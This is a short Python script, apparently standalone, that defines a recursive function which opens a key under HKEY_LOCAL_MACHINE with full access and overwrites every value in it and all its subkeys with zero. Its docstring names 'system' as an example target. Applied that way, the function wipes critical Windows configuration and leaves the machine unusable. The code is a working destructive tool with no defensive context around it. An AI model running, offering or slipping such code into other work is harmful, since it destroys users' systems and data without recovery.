import winreg

def reg2_0(reg_key:str) -> None:
    """Changes all changeable values of the registry key provided to zero. (i.e. 'system')"""

    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_key, 0, winreg.KEY_ALL_ACCESS)
        index: int = 0

        while True:
            try:
                name, value, _ = winreg.EnumValue(key, index)
                if isinstance(value, int):
                    winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, 0)
                elif isinstance(value, str):
                    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, "0")

                index += 1
            except OSError:
                break

        # Rekursiv alle Unterordner durchgehen
        index = 0
        while True:
            try:
                subkey_name = winreg.EnumKey(key, index)
                subkey = reg_key + "\\" + subkey_name

                reg2_0(subkey)

                index += 1
            except OSError:
                break

        winreg.CloseKey(key)
    except FileNotFoundError:
        pass